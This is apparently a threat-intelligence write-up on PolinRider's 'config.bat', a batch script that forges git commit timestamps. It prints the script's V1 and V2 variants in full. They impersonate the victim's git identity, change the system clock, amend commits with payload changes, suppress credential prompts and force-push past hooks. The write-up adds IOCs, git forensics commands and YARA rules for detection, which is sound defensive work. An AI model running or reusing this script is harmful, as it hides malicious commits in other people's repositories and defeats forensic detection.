# `config.bat` Analysis: The Timestamp-Forgery Push Script

**Date:** 2026-06-27  
**Task:** H — Investigate `config.bat` orchestrator  
**Status:** Complete — live samples recovered from 8+ victim repos

---

## Summary

`config.bat` is not a generic orchestrator or target-selection script. It is PolinRider's
**timestamp-forgery commit amender**. Its sole purpose is to inject previously-staged payload
changes into the victim's last git commit while **forging the committer timestamp** to match
the original author timestamp — erasing the date discrepancy that is our primary detection
signal for direct-injection attacks.

This is the mechanism by which npm-vector infections evade detection. When a victim installs a
malicious npm package, the Stage 4 RAT eventually runs `config.bat` on the victim's machine.
The result is a git commit that appears identical in age to the last legitimate commit, with
no timestamp gap.

**The timestamp discrepancy that identified every zurichjs injection was only visible because
the actor used a different, less-refined attack path for those targets.**

---

## Recovered Samples

Live `config.bat` samples were found committed in 8 victim repositories on GitHub (actor failed
to add them to `.gitignore`):

| Repo | Version | Notes |
|------|---------|-------|
| `one-project-one-month/Easy-Trip-Python` | V2 | Full credential suppression |
| `fahad-khan11/auth-app-with-nestjs-api` | V2 | Full credential suppression |
| `fahad-khan11/image-generate-SaaS_App-using-Next-Mern-` | V2 | Full credential suppression |
| `farahos/Point-of-sale-management-system` | V1 | No credential suppression |
| `Sohaib909/E-comm-Backend` | V1+ | Partial credential suppression |
| `Saarcasmic/BulkEmailCampaignManager` | V1 | No credential suppression |
| `srushtibhilare/women` | V1 | No credential suppression |
| `HUZAIFASAJJAD012/Job_protal` | V1 | No credential suppression |

---

## Annotated V1 (early variant)

```bat
@echo off
:: --- Step 1: Read victim's last commit metadata ---
for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%Y-%%m-%%d --format=%%cd"') do set LAST_COMMIT_DATE=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --date=format-local:%%H:%%M:%%S --format=%%cd"') do set LAST_COMMIT_TIME=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%s"') do set LAST_COMMIT_TEXT=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%an"') do set USER_NAME=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%ae"') do set USER_EMAIL=%%A
for /f "delims=" %%A in ('git rev-parse --abbrev-ref HEAD') do set CURRENT_BRANCH=%%A

echo %LAST_COMMIT_DATE% %LAST_COMMIT_TIME%
echo %LAST_COMMIT_TEXT%
echo %USER_NAME% (%USER_EMAIL%)
echo Branch: %CURRENT_BRANCH%

:: --- Step 2: Change system clock to the victim's last commit date ---
set CURRENT_DATE=%date%
set CURRENT_TIME=%time%
date %LAST_COMMIT_DATE%          ← System date set to victim's last commit date
time %LAST_COMMIT_TIME%          ← System time set to victim's last commit time

:: --- Step 3: Amend with payload, spoofed identity, spoofed clock ---
git config --local user.name %USER_NAME%    ← Impersonate victim's git identity
git config --local user.email %USER_EMAIL%
git add .                                   ← Stage everything (including payload)
git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
                                            ← Amend: committer date = system clock = author date

:: --- Step 4: Restore system clock ---
date %CURRENT_DATE%
time %CURRENT_TIME%

:: --- Step 5: Force-push, bypassing hooks ---
git push -uf origin %CURRENT_BRANCH% --no-verify
@echo on
```

**Effect:** The amended commit has `AuthorDate == CommitterDate` — identical timestamps. Any
tool checking for a timestamp gap (our primary zurichjs detection signal) will find nothing.

---

## Annotated V2 (newer variant — full automation)

V2 adds four environment variables at the top:

```bat
SET GIT_TERMINAL_PROMPT=0           ← Disables git's own credential prompt
SET GCM_INTERACTIVE=Never           ← Disables Git Credential Manager interactive prompts
SET GIT_ASKPASS=echo                ← Makes credential helper return empty string silently
SET GIT_CONFIG_NOSYSTEM=1           ← Ignores system-level git config (prevents credential hooks)
```

And changes the push command:

```bat
git config --local --replace-all user.name "%USER_NAME%"    ← --replace-all: no error if key exists
git config --local --replace-all user.email "%USER_EMAIL%"
git config --local credential.helper ""                      ← Clears credential helper
git -c credential.helper="" push -uf origin %CURRENT_BRANCH% --no-verify
                                                             ← Also pass at runtime, belt-and-suspenders
```

**Purpose of V2 additions:** On some systems, git prompts for credentials even with stored
ones. If this prompt appears during automated execution, the script stalls indefinitely. V2's
credential suppression makes the push fail silently rather than blocking — acceptable for the
actor since most victims have cached credentials that work without prompting.

---

## Three Variants of the Same Script

| Name | Difference | Use case |
|------|-----------|----------|
| `config.bat` | Core script; named to look like a config file | Primary deployment on victim machine |
| `temp_auto_push.bat` | Functionally identical; explicit "temporary" name | Used on victim repo root during npm infection |
| `temp_interactive_push.bat` | Adds `pause` at end | Used when actor runs manually and wants to read output before window closes |

All three perform the same timestamp-forgery amend-and-push. The name `config.bat` is chosen
to camouflage the file in a project root where `*.config.*` files are expected. The `temp_`
prefix on the other two makes them look like temporary developer scripts.

**Hiding:** All three are intended to be added to `.gitignore` by the npm postinstall payload,
so they don't appear in `git status` or `git add`. The 8 repos where we found `config.bat`
committed are cases where the `.gitignore` injection failed — leaving the artifact exposed in
git history.

---

## Additional Artifacts (Innovative-VAS signatures)

Two more artifacts tracked by detection tools:

- **`branch_structure.json`**: Listed alongside the bat files in `.gitignore` injection targets.
  Not found in GitHub code search — successfully hidden in all known cases. Likely contains a
  map of local repos and their branches for the orchestrator to iterate over when selecting
  injection targets across multiple victim repos.

- **`temp_interactive_push.bat`**: 102 GitHub results (more prevalent than `config.bat` at 8).
  The higher count may reflect this being the version used during actor testing/exploration
  before automation is established — the `pause` makes it useful for debugging.

---

## Critical Implication: Two Attack Paths, Two Detection Profiles

### Path A — Direct git injection (zurichjs cases)

Executed from the **actor's infrastructure**. The actor clones the victim's repo, rewrites a
merge commit with an old fake author date, and force-pushes. `config.bat` is NOT involved.

**Detection signal:** Author date is old (copied from original PR); committer date reflects
actual push time. **Gap is visible.** This is how we found all 5 zurichjs injections.

### Path B — npm package vector (config.bat executes on victim's machine)

Executed on the **victim's machine** by the Stage 4 RAT after npm install. The RAT stages
the payload into a config file, then runs `config.bat`, which:
1. Reads the victim's actual last commit date
2. Changes the system clock to that date
3. Amends the commit → committer date = author date
4. Force-pushes

**Detection signal:** None (timestamps match). The infected commit looks identical in age to
the original. **This is the undetectable path.**

| | Path A | Path B |
|-|--------|--------|
| Execution location | Actor's machine | Victim's machine |
| Timestamp gap | Yes (detectable) | No (evaded) |
| `config.bat` present | No | Yes (usually gitignored) |
| Scale | Targeted (specific repos) | Mass (all repos with git push access) |
| Detection | Timestamp delta | `config.bat` in `.gitignore` or file system |

The 1,950+ victims in the OpenSourceMalware list were overwhelmingly hit via Path B (npm
package → postinstall → Stage 4 → `config.bat`). The zurichjs cases are Path A — more
targeted, less automated, and accidentally more detectable.

---

## Detection Rules

### Host-level (victim workstation)

```
# Filesystem artifacts to scan for
config.bat               ← core amender
temp_auto_push.bat       ← same script, auto name
temp_interactive_push.bat ← same script, interactive name
branch_structure.json    ← repo-map file (actor's target list)
```

### .gitignore inspection

The actor injects these exact lines into `.gitignore`:
```
config.bat
temp_auto_push.bat
temp_interactive_push.bat
branch_structure.json
```
A `.gitignore` containing any of these is a **high-confidence infection indicator** — no
legitimate project ever needs to ignore these filenames.

### Git history forensics

```bash
# Scan for amended commits where committer = author exactly (to the second)
git log --format="%H %ai %ci %s" | awk '{if($2==$5 && $3==$6) print}'

# Scan for force-push events (reflog shows non-fast-forward transitions)
git reflog --format="%H %gs" | grep "update by force"
```

Note: matching timestamps alone is not sufficient (many legitimate commits also have matching
timestamps). Combine with: (a) config file modification in the commit, (b) known payload
strings, (c) presence of `.gitignore` entries listed above.

### YARA (host scan)

```yara
rule PolinRider_ConfigBat_V1 {
    meta:
        description = "PolinRider config.bat / temp_auto_push.bat (V1 — no credential suppression)"
        author = "analysis2"
        date = "2026-06-27"
    strings:
        $date_cmd  = "git log -1 --date=format-local" ascii
        $commit_amend = "git commit --amend" ascii
        $force_push   = "push -uf origin" ascii
        $restore_date = "Date restored to" ascii
    condition:
        all of them
}

rule PolinRider_ConfigBat_V2 {
    meta:
        description = "PolinRider config.bat V2 (with GCM_INTERACTIVE + credential.helper suppression)"
        author = "analysis2"
        date = "2026-06-27"
    strings:
        $gcm     = "GCM_INTERACTIVE=Never" ascii
        $askpass = "GIT_ASKPASS=echo" ascii
        $nosys   = "GIT_CONFIG_NOSYSTEM=1" ascii
        $amend   = "git commit --amend" ascii
    condition:
        ($gcm or $askpass) and $nosys and $amend
}
```

---

## IOCs

```
# Artifact filenames (all are PolinRider tooling)
config.bat
temp_auto_push.bat
temp_interactive_push.bat
branch_structure.json

# .gitignore injection strings (any one of these in .gitignore = infection indicator)
"config.bat" in .gitignore
"temp_auto_push.bat" in .gitignore
"temp_interactive_push.bat" in .gitignore
"branch_structure.json" in .gitignore

# Command strings unique to this tooling (inside bat files)
"GCM_INTERACTIVE=Never"
"GIT_CONFIG_NOSYSTEM=1"
"Date temporarily changed to"
"complete amend last commit!"
```

---

## Victim Repos Where `config.bat` Was Accidentally Committed

These repos have `config.bat` tracked in git (actor failed to gitignore it):

```
one-project-one-month/Easy-Trip-Python
farahos/Point-of-sale-management-system
Sohaib909/E-comm-Backend
Saarcasmic/BulkEmailCampaignManager
fahad-khan11/auth-app-with-nestjs-api
fahad-khan11/image-generate-SaaS_App-using-Next-Mern-
srushtibhilare/women
HUZAIFASAJJAD012/Job_protal
```
